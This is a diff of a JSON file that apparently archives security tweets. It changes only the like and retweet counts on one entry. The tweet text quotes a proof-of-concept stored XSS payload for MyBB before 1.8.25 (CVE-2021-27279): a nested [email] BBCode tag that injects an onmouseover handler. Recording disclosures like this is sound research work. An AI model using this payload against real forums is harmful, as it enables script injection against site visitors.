@@ -951,10 +951,10 @@
     "expanded_url": [
         "https://github.com/mybb/mybb/security/advisories/GHSA-6483-hcpp-p75w"
     ],
-    "tweetfavorites": 197,
+    "tweetfavorites": 206,
     "tweetquotes": 2,
     "tweetreplies": 3,
-    "tweetretweets": 68,
+    "tweetretweets": 72,
     "tweettext": "🎁 PoC for a stored XSS in MyBB &lt; 1.8.25 (CVE-2021-27279). The vulnerability was found by our researcher Igor Sak-Sakovskiy.\n\nPayload: [email]a@a.a?[email=a@a.a? onmouseover=alert(1) a]a[/email][/email]\n\nAdvisory: https://t.co/i7v9mTie2p https://t.co/eHodNO7KZn",
     "tweettime": "2021-12-07, 13:39:16",
     "tweeturl": "https://twitter.com/ptswarm/status/1468213521666260994",
